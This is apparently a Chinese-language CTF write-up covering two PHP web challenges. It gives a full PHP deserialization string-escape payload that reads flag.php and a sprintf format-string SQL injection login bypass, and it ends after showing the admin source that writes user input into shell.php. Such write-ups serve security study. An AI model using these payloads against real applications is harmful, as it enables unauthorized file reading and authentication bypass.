---
layout: post
title: 
data: 
categories: 
tags: 
description: 
excerpt_separator: ""
---

# Ezunserialize

## 题目描述

直接给了源码：

```php
<?php
show_source("index.php");
function write($data) {
    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
}

function read($data) {
    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this->username = $a;
        $this->password = $b;
    }
}

class B{
    public $b = 'gqy';
    function __destruct(){
        $c = 'a'.$this->b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this->c);
        return 'nice';
    }
}

$a = new A($_GET['a'],$_GET['b']);
//省略了存储序列化数据的过程,下面是取出来并反序列化的操作
$b = unserialize(read(write(serialize($a))));
```

## 解题思路

思路很明确由B类到C类读取flag.php，不过看起来只能传入给A类的字符串，需要序列化逃逸。

read()函数会将`'\0\0\0'`替换为`"\0*\0"`，注意一下，前者由单引号围绕，不表示转义，即包含6个字符，而后者由双引号包围，转义为空白符，即包含三个字符。

先构造理想的序列化字符串：

```php
<?php
$c = new C();
$b = new B();

$c->c = "flag.php";
$b->b = $c;
echo serialize(new A("foo", $b));
?>
```

结果：

```php
O:1:"A":2:{s:8:"username";s:3:"foo";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}
```

需要吞掉24个字符，于是提交的序列化字符串为：

```shell
O:1:"A":2:{s:8:"username";s:48:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";s:8:"password";s:74:";";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}";}
```

Payload：

```
?a=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0
&b=%3B%22%3Bs%3A8%3A%22password%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22b%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A1%3A%22c%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D
```

## 备注

1. 这道题就是完全没有注意到单引号，一直在想属性的访问控制什么的。

# babytricks

## 题目描述

一个登录框，源码中有提示

```html
<!-- tips:select * from user where user='$user' and passwd='%s'-->
```

## 解题思路

很明显的格式化字符串，Payload：

```
POST：user=admin%1$c
passwd=39
```

有个跳转，输出了一个数组：

```
Array(
    [0] => 1
    [id] => 1
    [1] => admin
    [user] => admin
    [2] => GoODLUcKcTFer202OHAckFuN
    [passwd] => GoODLUcKcTFer202OHAckFuN
)
```

应该是账号密码了，然后说前台什么都没有了，那就去后台，扫一下目录，可以看到源码：

```php
Your sandbox: ./shells/LYmjizTyfRfRj1bz/ set your shell
<?php
error_reporting(0);
session_save_path('session');
session_start();
require_once './init.php';
if($_SESSION['login']!=1){
    die("<script>window.location.href='./index.php'</script>");
}
if($_GET['shell']){
    $shell= addslashes($_GET['shell']);
    $file = file_get_contents('./shell.php');
    $file = preg_replace("/\\\$shell = '.*';/s", "\$shell = '{$shell}';", $file);
    file_put_contents('./shell.php', $file);
}else{
    echo "set your shell"."<br>";
    chdir("/");
    highlight_file(dirname(__FILE__)."/admin.php");
}
?>
```

